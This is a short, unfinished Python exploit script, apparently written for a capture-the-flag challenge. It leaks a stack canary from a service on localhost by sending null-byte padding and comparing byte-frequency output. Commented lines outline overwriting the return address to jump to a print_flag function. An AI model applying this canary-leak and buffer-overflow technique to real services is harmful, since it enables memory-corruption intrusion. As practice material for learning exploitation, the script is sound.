#!/usr/bin/python3

import socket
import telnetlib



ENTER = '\n'
REPEAT_CHAR = b'\x00'
CANARY_SIZE = 0x10



def get_data_for_distribution(n):
    '''
        Returns the data that needs to be sent in order to get the last n bytes of the canary
    '''
    repeat = 0x408 + CANARY_SIZE - 1
    repeat -= n
    # data += b'B'*0x10   # overwrite base pointer and stuff
    # data += 0x40188d.to_bytes(8, 'little')  # set return address to print_flag
    return REPEAT_CHAR * repeat



def parse_distribution(output):
    result = {}
    lines = output.strip().split('\n')

    for line in lines:
        columns = line.split()

        if(columns[0][0].isdigit()):
            count = int(columns[1])

            if count != 0:
                byte = chr(int(columns[0])).encode('latin-1')
                result[byte] = count

    return result



def find_distribution(telnet, n):
    data = get_data_for_distribution(n)
    output = send_data(telnet, data)
    return parse_distribution(output)



def send_data(telnet, data):
    data_count = str(0x418)
    data_count += ENTER
    print('Data count: ' + data_count)

    output = ''
    for i in range(0, 10):
        data_to_send = get_data_for_distribution(i)
        data_to_send += ENTER.encode('ASCII')
        print('Data: ' + str(len(data_to_send)))

        telnet.sock.send(data_count.encode('ASCII'))
        telnet.sock.send(data_to_send)
        recv = telnet.sock.recv(1024).decode('ASCII')
        while(recv):
            output += recv
            recv = telnet.sock.recv(1024).decode('ASCII')
        telnet.interact()
        print('Output: ' + output)
    return output



def find_canary(telnet):
    # TODO: iterate from 1 to CANARY_SIZE and keep sending and getting back frequences
    # Remember frequencies and figure out what new character has appeared (back to front)
    # Collect all characters as bytes or something
    canary = b''
    distribution = find_distribution(telnet, 0)
    print(canary)
    print(distribution)
    for i in range(1, CANARY_SIZE + 1):
        new_distribution = find_distribution(telnet, i)
        for byte, count in new_distribution.items():
            if (byte != REPEAT_CHAR):
                if (byte not in distribution or distribution[byte] != count):
                    print('Found byte with new distribution: ' + str(byte) + '->' + str(count))
                    canary = byte + canary
        distribution = new_distribution
        print(canary)
        print(distribution)

    return canary



# TODO: find canary, then send and overwrite it
telnet = telnetlib.Telnet()
telnet.sock = socket.create_connection(('localhost', 2002))

# telnet.interact()
canary = find_canary(telnet)
# print(canary)



telnet.sock.close()

